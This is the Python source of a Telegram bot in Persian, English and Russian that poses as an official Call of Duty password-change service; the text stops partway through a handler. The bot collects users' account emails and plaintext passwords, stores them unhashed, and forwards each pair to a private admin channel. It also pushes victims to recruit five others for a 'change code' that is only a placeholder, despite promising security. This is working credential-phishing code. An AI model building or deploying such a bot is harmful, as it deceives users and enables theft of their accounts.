import asyncio
import logging
import os
import re
import aiosqlite
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# ================= تنظیمات =================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
PRIVATE_CHANNEL_ID = int(os.environ.get("PRIVATE_CHANNEL_ID", -100123456789))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", -100987654321))
PUBLIC_CHANNEL_USERNAME = os.environ.get("PUBLIC_CHANNEL_USERNAME", "YourChannel")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBot")
VIDEO_FILE_ID = os.environ.get("VIDEO_FILE_ID", "")
PHOTO_FILE_ID = os.environ.get("PHOTO_FILE_ID", "")
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# ================= ترجمه‌های حرفه‌ای =================
T = {
    'fa': {
        'select_lang': (
            "🌐 <b>به ربات چنج پسورد کالاف دیوتی خوش آمدید!</b>\n\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Please select your language:\n"
            "Пожалуйста, выберите ваш язык:"
        ),
        'welcome': (
            "🎉✨ <b>به ربات رسمی چنج پسورد کالاف دیوتی خوش آمدید!</b> ✨🎉\n\n"
            "📌 در این ربات، شما می‌توانید:\n"
            "✅ پسورد اکانت‌های کالاف دیوتی خود را به صورت امن تغییر دهید\n"
            "✅ اکانت‌های خود را مدیریت و ویرایش کنید\n"
            "✅ با دعوت دوستان، کدهای چنج رایگان دریافت کنید\n\n"
            "🔒 امنیت اطلاعات شما اولویت اول ماست.\n\n"
            "👇 برای شروع، یکی از گزینه‌های زیر را انتخاب کنید:"
        ),
        'btn_my_accounts': "👤 اکانت‌های من",
        'btn_change_pass': "🔑 چنج پسورد",
        'btn_points': "🏆 امتیازات و دعوت",
        'btn_language': "🌐 تغییر زبان",
        'join_channel': (
            "⚠️ <b>عضویت در کانال الزامی است</b>\n\n"
            "برای استفاده از خدمات ربات، لطفاً ابتدا در کانال ما عضو شوید.\n"
            "پس از عضویت، روی دکمه «بررسی عضویت» کلیک کنید."
        ),
        'join_btn': "📢 عضویت در کانال",
        'check_join': "✅ بررسی عضویت",
        'not_joined': "❌ شما هنوز عضو کانال نشده‌اید. لطفاً ابتدا عضو شوید.",
        'my_accounts_header': (
            "👤 <b>═══ اکانت‌های شما ═══</b>\n\n"
            "در این بخش می‌توانید تمام اکانت‌های ثبت‌شده خود را مشاهده و ویرایش کنید.\n"
            "برای ویرایش هر اکانت، روی دکمه مربوطه کلیک کنید."
        ),
        'no_accounts': (
            "📭 <b>هیچ اکانتی ثبت نشده است</b>\n\n"
            "شما هنوز هیچ اکانتی در ربات ثبت نکرده‌اید.\n"
            "برای ثبت اکانت جدید، روی دکمه «🔑 چنج پسورد» کلیک کنید."
        ),
        'points_header': (
            "🏆 <b>═══ امتیازات و دعوت ═══</b>\n\n"
            "🔥 وضعیت امتیازات شما:\n"
            "⭐ امتیاز کل: <b>{points}</b>\n"
            "👥 دعوت‌های موفق: <b>{refs}/5</b>\n"
            "🎯 تا کد چنج بعدی: <b>{remaining}</b> نفر\n\n"
            "💎 با دعوت هر دوست، یک قدم به کد چنج رایگان نزدیک‌تر شوید!\n\n"
            "🔗 لینک دعوت اختصاصی شما:\n"
            "<code>{link}</code>\n\n"
            "📊 برای مشاهده وضعیت دقیق، به بخش «اکانت‌های من» مراجعه کنید."
        ),
        'change_pass_step1': (
            "🔑 <b>═══ چنج پسورد اکانت ═══</b>\n\n"
            "📧 لطفاً ایمیل اکانت خود را ارسال کنید.\n"
            "⚠️ ایمیل باید معتبر و صحیح باشد.\n"
            "❌ برای لغو عملیات، روی دکمه «🔙 بازگشت» کلیک کنید."
        ),
        'invalid_email': "❌ ایمیل وارد شده نامعتبر است. لطفاً یک ایمیل صحیح وارد کنید.",
        'duplicate_email': (
            "⚠️ <b>ایمیل تکراری است!</b>\n\n"
            "این ایمیل قبلاً در ربات ثبت شده است.\n"
            "برای ویرایش آن، به بخش «👤 اکانت‌های من» مراجعه کنید."
        ),
        'change_pass_step2': "🔐 لطفاً پسورد اکانت خود را ارسال کنید.",
        'change_pass_step3': "🛡 لطفاً نوع اکانت خود را انتخاب کنید:",
        'type_crack': "💀 خیلی کرک",
        'type_semi': "⚠️ نیمه سیف",
        'type_safe': "✅ سیف",
        'submitted': (
            "✅ <b>اطلاعات شما با موفقیت ثبت شد!</b>\n\n"
            "درخواست شما برای ادمین ارسال شد و در انتظار تأیید است.\n"
            "پس از تأیید، پیامی برای شما ارسال خواهد شد."
        ),
        'admin_req': (
            "🔔 <b>درخواست چنج جدید</b>\n\n"
            "👤 کاربر: <code>{user_id}</code>\n"
            "📧 ایمیل: <code>{email}</code>\n"
            "🔐 پسورد: <code>{password}</code>\n"
            "🛡 نوع: {type}"
        ),
        'approve_btn': "✅ تأیید و ارسال به کاربر",
        'success_photo_caption': (
            "🎉 <b>اکانت شما با موفقیت آماده شد!</b>\n\n"
            "برای دریافت کد چنج، روی دکمه زیر کلیک کنید."
        ),
        'get_code': "📦 دریافت کد چنج",
        'need_ref': (
            "❌ <b>دریافت کد چنج</b>\n\n"
            "برای دریافت کد چنج، باید ۵ نفر را با لینک دعوت خود به ربات اضافه کنید.\n\n"
            "👥 دعوت‌های شما: <b>{refs}/5</b>\n"
            "🔗 لینک دعوت:\n"
            "<code>{link}</code>"
        ),
        'my_points': "🏆 امتیازات شما: <b>{points}</b>",
        'acc_list': "📋 لیست اکانت‌های شما:",
        'edit_menu': "⚙️ <b>ویرایش اکانت {email}</b>\n\nلطفاً بخش مورد نظر را انتخاب کنید:",
        'edit_email_btn': "📧 ویرایش ایمیل",
        'edit_pass_btn': "🔐 ویرایش پسورد",
        'back_btn': "🔙 بازگشت",
        'enter_new_email': "📧 لطفاً ایمیل جدید را ارسال کنید:",
        'enter_new_pass': "🔐 لطفاً پسورد جدید را ارسال کنید:",
        'edit_success': "✅ اطلاعات با موفقیت ویرایش شد و در کانال ادمین نیز به‌روزرسانی گردید.",
    },
    'en': {
        'select_lang': (
            "🌐 <b>Welcome to COD Password Change Bot!</b>\n\n"
            "Please select your language:\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Пожалуйста, выберите ваш язык:"
        ),
        'welcome': (
            "🎉✨ <b>Welcome to the Official COD Password Change Bot!</b> ✨🎉\n\n"
            "📌 In this bot, you can:\n"
            "✅ Securely change your Call of Duty account passwords\n"
            "✅ Manage and edit your accounts\n"
            "✅ Invite friends to earn free change codes\n\n"
            "🔒 Your information security is our top priority.\n\n"
            "👇 Please select one of the options below to get started:"
        ),
        'btn_my_accounts': "👤 My Accounts",
        'btn_change_pass': "🔑 Change Password",
        'btn_points': "🏆 Points & Referral",
        'btn_language': "🌐 Change Language",
        'join_channel': (
            "⚠️ <b>Channel Membership Required</b>\n\n"
            "To use the bot's services, please join our channel first.\n"
            "After joining, click the «Check Membership» button."
        ),
        'join_btn': "📢 Join Channel",
        'check_join': "✅ Check Membership",
        'not_joined': "❌ You haven't joined the channel yet. Please join first.",
        'my_accounts_header': (
            "👤 <b>═══ Your Accounts ═══</b>\n\n"
            "In this section, you can view and edit all your registered accounts.\n"
            "To edit an account, click the corresponding button."
        ),
        'no_accounts': (
            "📭 <b>No Accounts Registered</b>\n\n"
            "You haven't registered any accounts in the bot yet.\n"
            "To register a new account, click the «🔑 Change Password» button."
        ),
        'points_header': (
            "🏆 <b>═══ Points & Referral ═══</b>\n\n"
            "🔥 Your Points Status:\n"
            "⭐ Total Points: <b>{points}</b>\n"
            "👥 Successful Referrals: <b>{refs}/5</b>\n"
            "🎯 Until Next Change Code: <b>{remaining}</b> more\n\n"
            "💎 With each friend you invite, you get one step closer to a free change code!\n\n"
            "🔗 Your Exclusive Referral Link:\n"
            "<code>{link}</code>\n\n"
            "📊 For detailed status, visit the «My Accounts» section."
        ),
        'change_pass_step1': (
            "🔑 <b>═══ Change Account Password ═══</b>\n\n"
            "📧 Please send your account email.\n"
            "⚠️ The email must be valid and correct.\n"
            "❌ To cancel the operation, click the «🔙 Back» button."
        ),
        'invalid_email': "❌ The email entered is invalid. Please enter a correct email.",
        'duplicate_email': (
            "⚠️ <b>Duplicate Email!</b>\n\n"
            "This email has already been registered in the bot.\n"
            "To edit it, visit the «👤 My Accounts» section."
        ),
        'change_pass_step2': "🔐 Please send your account password.",
        'change_pass_step3': "🛡 Please select your account type:",
        'type_crack': "💀 Very Cracked",
        'type_semi': "⚠️ Semi-Safe",
        'type_safe': "✅ Safe",
        'submitted': (
            "✅ <b>Your information has been successfully submitted!</b>\n\n"
            "Your request has been sent to the admin and is pending approval.\n"
            "You will receive a message once approved."
        ),
        'admin_req': (
            "🔔 <b>New Change Request</b>\n\n"
            "👤 User: <code>{user_id}</code>\n"
            "📧 Email: <code>{email}</code>\n"
            "🔐 Password: <code>{password}</code>\n"
            "🛡 Type: {type}"
        ),
        'approve_btn': "✅ Approve & Send to User",
        'success_photo_caption': (
            "🎉 <b>Your account is successfully ready!</b>\n\n"
            "To receive the change code, click the button below."
        ),
        'get_code': "📦 Get Change Code",
        'need_ref': (
            "❌ <b>Get Change Code</b>\n\n"
            "To receive the change code, you need to invite 5 people to the bot using your referral link.\n\n"
            "👥 Your Referrals: <b>{refs}/5</b>\n"
            "🔗 Referral Link:\n"
            "<code>{link}</code>"
        ),
        'my_points': "🏆 Your Points: <b>{points}</b>",
        'acc_list': "📋 Your Accounts List:",
        'edit_menu': "⚙️ <b>Edit Account {email}</b>\n\nPlease select the section to edit:",
        'edit_email_btn': "📧 Edit Email",
        'edit_pass_btn': "🔐 Edit Password",
        'back_btn': "🔙 Back",
        'enter_new_email': "📧 Please send the new email:",
        'enter_new_pass': "🔐 Please send the new password:",
        'edit_success': "✅ Information successfully edited and updated in the admin channel.",
    },
    'ru': {
        'select_lang': (
            "🌐 <b>Добро пожаловать в бот смены паролей COD!</b>\n\n"
            "Пожалуйста, выберите ваш язык:\n"
            "لطفاً زبان مورد نظر خود را انتخاب کنید:\n"
            "Please select your language:"
        ),
        'welcome': (
            "🎉✨ <b>Добро пожаловать в официальный бот смены паролей COD!</b> ✨🎉\n\n"
            "📌 В этом боте вы можете:\n"
            "✅ Безопасно менять пароли аккаунтов Call of Duty\n"
            "✅ Управлять и редактировать свои аккаунты\n"
            "✅ Приглашать друзей для получения бесплатных кодов смены\n\n"
            "🔒 Безопасность вашей информации — наш приоритет.\n\n"
            "👇 Выберите один из вариантов ниже, чтобы начать:"
        ),
        'btn_my_accounts': "👤 Мои аккаунты",
        'btn_change_pass': "🔑 Сменить пароль",
        'btn_points': "🏆 Баллы и рефералы",
        'btn_language': "🌐 Сменить язык",
        'join_channel': (
            "⚠️ <b>Требуется подписка на канал</b>\n\n"
            "Чтобы использовать услуги бота, пожалуйста, сначала подпишитесь на наш канал.\n"
            "После подписки нажмите кнопку «Проверить подписку»."
        ),
        'join_btn': "📢 Подписаться",
        'check_join': "✅ Проверить подписку",
        'not_joined': "❌ Вы еще не подписались на канал. Пожалуйста, подпишитесь.",
        'my_accounts_header': (
            "👤 <b>═══ Ваши аккаунты ═══</b>\n\n"
            "В этом разделе вы можете просматривать и редактировать все зарегистрированные аккаунты.\n"
            "Чтобы отредактировать аккаунт, нажмите соответствующую кнопку."
        ),
        'no_accounts': (
            "📭 <b>Аккаунты не зарегистрированы</b>\n\n"
            "Вы еще не зарегистрировали ни одного аккаунта в боте.\n"
            "Чтобы зарегистрировать новый аккаунт, нажмите кнопку «🔑 Сменить пароль»."
        ),
        'points_header': (
            "🏆 <b>═══ Баллы и рефералы ═══</b>\n\n"
            "🔥 Статус ваших баллов:\n"
            "⭐ Всего баллов: <b>{points}</b>\n"
            "👥 Успешные рефералы: <b>{refs}/5</b>\n"
            "🎯 До следующего кода смены: <b>{remaining}</b> чел.\n\n"
            "💎 С каждым приглашенным другом вы на шаг ближе к бесплатному коду смены!\n\n"
            "🔗 Ваша эксклюзивная реферальная ссылка:\n"
            "<code>{link}</code>\n\n"
            "📊 Для детального статуса посетите раздел «Мои аккаунты»."
        ),
        'change_pass_step1': (
            "🔑 <b>═══ Смена пароля аккаунта ═══</b>\n\n"
            "📧 Пожалуйста, отправьте email вашего аккаунта.\n"
            "⚠️ Email должен быть действительным и корректным.\n"
            "❌ Чтобы отменить операцию, нажмите кнопку «🔙 Назад»."
        ),
        'invalid_email': "❌ Введенный email недействителен. Пожалуйста, введите корректный email.",
        'duplicate_email': (
            "⚠️ <b>Дубликат email!</b>\n\n"
            "Этот email уже зарегистрирован в боте.\n"
            "Чтобы отредактировать его, посетите раздел «👤 Мои аккаунты»."
        ),
        'change_pass_step2': "🔐 Пожалуйста, отправьте пароль вашего аккаунта.",
        'change_pass_step3': "🛡 Пожалуйста, выберите тип вашего аккаунта:",
        'type_crack': "💀 Очень взломан",
        'type_semi': "⚠️ Полу-безопасный",
        'type_safe': "✅ Безопасный",
        'submitted': (
            "✅ <b>Ваша информация успешно отправлена!</b>\n\n"
            "Ваш запрос отправлен администратору и ожидает одобрения.\n"
            "Вы получите сообщение после одобрения."
        ),
        'admin_req': (
            "🔔 <b>Новый запрос на смену</b>\n\n"
            "👤 Пользователь: <code>{user_id}</code>\n"
            "📧 Email: <code>{email}</code>\n"
            "🔐 Пароль: <code>{password}</code>\n"
            "🛡 Тип: {type}"
        ),
        'approve_btn': "✅ Одобрить и отправить пользователю",
        'success_photo_caption': (
            "🎉 <b>Ваш аккаунт успешно готов!</b>\n\n"
            "Чтобы получить код смены, нажмите кнопку ниже."
        ),
        'get_code': "📦 Получить код смены",
        'need_ref': (
            "❌ <b>Получить код смены</b>\n\n"
            "Чтобы получить код смены, вам нужно пригласить 5 человек в бот по вашей реферальной ссылке.\n\n"
            "👥 Ваши рефералы: <b>{refs}/5</b>\n"
            "🔗 Реферальная ссылка:\n"
            "<code>{link}</code>"
        ),
        'my_points': "🏆 Ваши баллы: <b>{points}</b>",
        'acc_list': "📋 Список ваших аккаунтов:",
        'edit_menu': "⚙️ <b>Редактировать аккаунт {email}</b>\n\nПожалуйста, выберите раздел для редактирования:",
        'edit_email_btn': "📧 Изменить Email",
        'edit_pass_btn': "🔐 Изменить Пароль",
        'back_btn': "🔙 Назад",
        'enter_new_email': "📧 Пожалуйста, отправьте новый email:",
        'enter_new_pass': "🔐 Пожалуйста, отправьте новый пароль:",
        'edit_success': "✅ Информация успешно отредактирована и обновлена в канале администратора.",
    }
}

# ================= دیتابیس =================
class DB:
    def __init__(self, db_name='bot.db'):
        self.db_name = db_name
    
    async def setup(self):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute('''CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                lang TEXT,
                referrals INTEGER DEFAULT 0,
                referred_by INTEGER
            )''')
            await db.execute('''CREATE TABLE IF NOT EXISTS accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT,
                password TEXT,
                type TEXT,
                status TEXT DEFAULT 'pending',
                admin_msg_id INTEGER
            )''')
            await db.commit()
    
    async def get_lang(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r and r[0] else None
    
    async def set_lang(self, user_id, lang):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE users SET lang = ? WHERE user_id = ?", (lang, user_id))
            await db.commit()
    
    async def add_user(self, user_id, referrer_id=None):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("INSERT OR IGNORE INTO users (user_id, referred_by) VALUES (?, ?)", (user_id, referrer_id))
            await db.commit()
    
    async def add_referral(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE users SET referrals = referrals + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
    
    async def get_referrals(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT referrals FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone()
                return r[0] if r else 0
    
    async def check_duplicate(self, user_id, email):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id FROM accounts WHERE user_id = ? AND email = ?", (user_id, email)) as c:
                return await c.fetchone() is not None
    
    async def add_account(self, user_id, email, password, type_str):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("INSERT INTO accounts (user_id, email, password, type) VALUES (?, ?, ?, ?)",
                                  (user_id, email, password, type_str)) as c:
                await db.commit()
                return c.lastrowid
    
    async def set_admin_msg_id(self, acc_id, msg_id):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET admin_msg_id = ? WHERE id = ?", (msg_id, acc_id))
            await db.commit()
    
    async def get_accounts(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id, email, password, type FROM accounts WHERE user_id = ?", (user_id,)) as c:
                return await c.fetchall()
    
    async def get_account(self, acc_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT user_id, email, password, type, admin_msg_id FROM accounts WHERE id = ?", (acc_id,)) as c:
                return await c.fetchone()
    
    async def update_account_email(self, acc_id, new_email):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET email = ? WHERE id = ?", (new_email, acc_id))
            await db.commit()
    
    async def update_account_pass(self, acc_id, new_pass):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute("UPDATE accounts SET password = ? WHERE id = ?", (new_pass, acc_id))
            await db.commit()

db = DB()
router = Router()

# ================= FSM States =================
class St(StatesGroup):
    wait_email = State()
    wait_pass = State()
    wait_type = State()
    wait_edit_email = State()
    wait_edit_pass = State()

# ================= کیبوردها =================
def lang_select_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")],
        [InlineKeyboardButton(text="🇮🇷 فارسی", callback_data="lang_fa")],
        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")]
    ])

def main_kb(l):
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text=T[l]['btn_my_accounts']),
                KeyboardButton(text=T[l]['btn_change_pass'])
            ],
            [
                KeyboardButton(text=T[l]['btn_points']),
                KeyboardButton(text=T[l]['btn_language'])
            ]
        ],
        resize_keyboard=True,
        is_persistent=True
    )

def join_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['join_btn'], url=f"https://t.me/{PUBLIC_CHANNEL_USERNAME}")],
        [InlineKeyboardButton(text=T[l]['check_join'], callback_data="check_join")]
    ])

def type_kb(l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['type_crack'], callback_data="type_crack")],
        [InlineKeyboardButton(text=T[l]['type_semi'], callback_data="type_semi")],
        [InlineKeyboardButton(text=T[l]['type_safe'], callback_data="type_safe")]
    ])

def approve_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ تأیید", callback_data=f"approve_{acc_id}")]
    ])

def get_code_kb(acc_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📦 دریافت", callback_data=f"get_code_{acc_id}")]
    ])

def acc_list_kb(accounts, l):
    kb = []
    for acc in accounts:
        kb.append([InlineKeyboardButton(text=f"{acc[1]} ({acc[3]})", callback_data=f"edit_{acc[0]}")])
    kb.append([InlineKeyboardButton(text=T[l]['back_btn'], callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def edit_acc_kb(acc_id, l):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=T[l]['edit_email_btn'], callback_data=f"req_edit_email_{acc_id}")],
        [InlineKeyboardButton(text=T[l]['edit_pass_btn'], callback_data=f"req_edit_pass_{acc_id}")],
        [InlineKeyboardButton(text=T[l]['back_btn'], callback_data="my_accounts")]
    ])

# ================= توابع کمکی =================
async def check_mem(bot, uid):
    try:
        m = await bot.get_chat_member(PUBLIC_CHANNEL_ID, uid)
        return m.status not in ['left', 'kicked', 'restricted']
    except:
        return True

async def send_welcome(m: Message, l: str):
    if VIDEO_FILE_ID:
        try:
            await m.answer_video(VIDEO_FILE_ID, caption=T[l]['welcome'], reply_markup=main_kb(l))
        except Exception as e:
            print(f"Video error: {e}")
            await m.answer(T[l]['welcome'], reply_markup=main_kb(l))
    else:
        await m.answer(T[l]['welcome'], reply_markup=main_kb(l))

def get_button_key(text):
    for lang in ['fa', 'en', 'ru']:
        for key, val in T[lang].items():
            if key.startswith('btn_') and val == text:
                return key
    return None

# ================= هندلرها =================
@router.message(CommandStart())
async def start(m: Message, command: CommandObject, state: FSMContext):
    uid = m.from_user.id
    
    # Handle referral
    if command.args and command.args.startswith('ref_'):
        try:
            ref_id = int(command.args.split('_')[1])
            if ref_id != uid:
                await db.add_user(uid, ref_id)
                await db.add_referral(ref_id)
        except:
            await db.add_user(uid)
    else:
        await db.add_user(uid)
    
    l = await db.get_lang(uid)
    
    # If no language set, show language selection
    if l is None:
        await m.answer(T['en']['select_lang'], reply_markup=lang_select_kb())
        return
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await send_welcome(m, l)

@router.callback_query(F.data == "check_join")
async def cb_check_join(c: CallbackQuery):
    l = await db.get_lang(c.from_user.id)
    if await check_mem(bot, c.from_user.id):
        await c.message.delete()
        await send_welcome(c.message, l)
    else:
        await c.answer(T[l]['not_joined'], show_alert=True)

@router.callback_query(F.data.startswith("lang_"))
async def cb_lang(c: CallbackQuery):
    lang = c.data.split('_')[1]
    await db.set_lang(c.from_user.id, lang)
    await c.message.delete()
    
    if not await check_mem(bot, c.from_user.id):
        await c.message.answer(T[lang]['join_channel'], reply_markup=join_kb(lang))
    else:
        await send_welcome(c.message, lang)
    await c.answer()

# ================= هندلرهای FSM =================
@router.message(St.wait_email)
async def fsm_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    email = m.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        await m.answer(T[l]['invalid_email'])
        return
    
    if await db.check_duplicate(m.from_user.id, email):
        await state.clear()
        await m.answer(T[l]['duplicate_email'])
        return
    
    await state.update_data(email=email)
    await state.set_state(St.wait_pass)
    await m.answer(T[l]['change_pass_step2'])

@router.message(St.wait_pass)
async def fsm_pass(m: Message, state: FSMContext):
    await state.update_data(password=m.text.strip())
    await state.set_state(St.wait_type)
    l = await db.get_lang(m.from_user.id)
    await m.answer(T[l]['change_pass_step3'], reply_markup=type_kb(l))

@router.callback_query(St.wait_type)
async def fsm_type(c: CallbackQuery, state: FSMContext):
    l = await db.get_lang(c.from_user.id)
    type_str = c.data.split('_')[1]
    
    data = await state.get_data()
    email = data['email']
    password = data['password']
    
    acc_id = await db.add_account(c.from_user.id, email, password, type_str)
    
    # Send to admin channel
    admin_text = T[l]['admin_req'].format(
        user_id=c.from_user.id,
        email=email,
        password=password,
        type=type_str
    )
    admin_msg = await bot.send_message(PRIVATE_CHANNEL_ID, admin_text, reply_markup=approve_kb(acc_id))
    
    await db.set_admin_msg_id(acc_id, admin_msg.message_id)
    
    await c.message.answer(T[l]['submitted'])
    await state.clear()
    await c.answer()

@router.message(St.wait_edit_email)
async def fsm_edit_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    email = m.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', email):
        await m.answer(T[l]['invalid_email'])
        return
    
    data = await state.get_data()
    acc_id = data['edit_acc_id']
    
    await db.update_account_email(acc_id, email)
    
    # Update admin channel
    acc = await db.get_account(acc_id)
    admin_msg_id = acc[4]
    if admin_msg_id:
        try:
            admin_text = T[l]['admin_req'].format(
                user_id=m.from_user.id,
                email=email,
                password=acc[2],
                type=acc[3]
            )
            await bot.edit_message_text(admin_text, PRIVATE_CHANNEL_ID, admin_msg_id)
        except Exception as e:
            print(f"Failed to edit admin msg: {e}")
    
    await m.answer(T[l]['edit_success'])
    await state.clear()

@router.message(St.wait_edit_pass)
async def fsm_edit_pass(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id)
    password = m.text.strip()
    
    data = await state.get_data()
    acc_id = data['edit_acc_id']
    
    await db.update_account_pass(acc_id, password)
    
    # Update admin channel
    acc = await db.get_account(acc_id)
    admin_msg_id = acc[4]
    if admin_msg_id:
        try:
            admin_text = T[l]['admin_req'].format(
                user_id=m.from_user.id,
                email=acc[1],
                password=password,
                type=acc[3]
            )
            await bot.edit_message_text(admin_text, PRIVATE_CHANNEL_ID, admin_msg_id)
        except Exception as e:
            print(f"Failed to edit admin msg: {e}")
    
    await m.answer(T[l]['edit_success'])
    await state.clear()

# ================= هندلرهای اصلی منو =================
@router.message(F.text)
async def handle_menu(m: Message, state: FSMContext):
    key = get_button_key(m.text)
    if key is None:
        return
    
    uid = m.from_user.id
    l = await db.get_lang(uid)
    
    if not await check_mem(bot, uid):
        await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
        return
    
    await state.clear()
    
    if key == 'btn_my_accounts':
        await show_my_accounts(m, l)
    elif key == 'btn_change_pass':
        await start_change_pass(m, l, state)
    elif key == 'btn_points':
        await show_points(m, l)
    elif key == 'btn_language':
        await m.answer(T[l]['select_lang'], reply_markup=lang_select_kb())

async def show_my_accounts(m: Message, l: str):
    accounts = await db.get_accounts(m.from_user.id)
    if not accounts:
        await m.answer(T[l]['no_accounts'])
    else:
        text = T[l]['my_accounts_header'] + "\n\n" + T[l]['acc_list']
        for i, acc in enumerate(accounts, 1):
            text += f"\n{i}️⃣ 📧 {acc[1]}\n   🛡 {acc[3]}\n"
        await m.answer(text, reply_markup=acc_list_kb(accounts, l))

async def start_change_pass(m: Message, l: str, state: FSMContext):
    await state.set_state(St.wait_email)
    await m.answer(T[l]['change_pass_step1'])

async def show_points(m: Message, l: str):
    refs = await db.get_referrals(m.from_user.id)
    points = refs * 10  # Example points calculation
    remaining = max(0, 5 - refs)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{m.from_user.id}"
    
    text = T[l]['points_header'].format(points=points, refs=refs, remaining=remaining, link=link)
    await m.answer(text)

# ================= هندلرهای ادمین =================
@router.callback_query(F.data.startswith("approve_"))
async def cb_approve(c: CallbackQuery):
    acc_id = int(c.data.split('_')[1])
    acc = await db.get_account(acc_id)
    if not acc:
        return
    
    user_id, email, password, type_str, admin_msg_id = acc
    l = await db.get_lang(user_id)
    
    # Send photo to user
    if PHOTO_FILE_ID:
        try:
            await bot.send_photo(
                user_id,
                PHOTO_FILE_ID,
                caption=T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
        except:
            await bot.send_message(
                user_id,
                T[l]['success_photo_caption'],
                reply_markup=get_code_kb(acc_id)
            )
    else:
        await bot.send_message(
            user_id,
            T[l]['success_photo_caption'],
            reply_markup=get_code_kb(acc_id)
        )
    
    await c.message.edit_reply_markup(reply_markup=None)
    await c.answer("Approved")

@router.callback_query(F.data.startswith("get_code_"))
async def cb_get_code(c: CallbackQuery):
    acc_id = int(c.data.split('_')[2])
    l = await db.get_lang(c.from_user.id)
    refs = await db.get_referrals(c.from_user.id)
    
    if refs >= 5:
        # Generate or fetch code
        await c.message.answer(f"🔑 <code>YOUR_CHANGE_CODE_{acc_id}</code>")
    else:
        link = f"https://t.me/{BOT_USERNAME}?start=ref_{c.from_user.id}"
        await c.message.answer(T[l]['need_ref'].format(refs=refs, link=link))
    await c.answer()

# ================= هندلرهای ویرایش اکانت =================
@router.callback_query(F.data.startswith("edit_"))
async def cb_edit_acc(c: CallbackQuery):
    acc_id = int(c.data.split('_')[1])
    l = await db.get_lang(c.from_user.id)
    acc = await db.get_account(acc_id)
    if not acc or acc[0] != c.from_user.id:
        await c.answer("Error", show_alert=True)
        return
    
    await c.message.edit_text(T[l]['edit_menu'].format(email=acc[1]), reply_markup=edit_acc_kb(acc_id, l))
    await c.answer()

@router.callback_query(F.data.startswith("req_edit_email_"))
async def cb_req_edit_email(c: CallbackQuery, state: FSMContext):
    acc_id = int(c.data.split('_')[3])
    await state.update_data(edit_acc_id=acc_id)
    await state.set_state(St.wait_edit_email)
    l = await db.get_lang(c.from_user.id)
    await c.message.answer(T[l]['enter_new_email'])
    await c.answer()

@router.callback_query(F.data.startswith("req_edit_pass_"))
async def cb_req_edit_pass(c: CallbackQuery, state: FSMContext):
    acc_id = int(c.data.split('_')[3])
    await state.update_data(edit_acc_id=acc_id)
    await state.set_state(St.wait_edit_pass)
    l = await db.get_lang(c.from_user.id)
    await c.message.answer(T[l]['enter_new_pass'])
    await c.answer()

@router.callback_query(F.data == "main_menu")
async def cb_main_menu(c: CallbackQuery, state: FSMContext):
    await state.clear()
    l = await db.get_lang(c.from_user.id)
    await c.message.delete()
    await send_welcome(c.message, l)
    await c.answer()

@router.callback_query(F.data == "my_accounts")
async def cb_my_accounts(c: CallbackQuery, state: FSMContext):
    await state.clear()
    l = await db.get_lang(c.from_user.id)
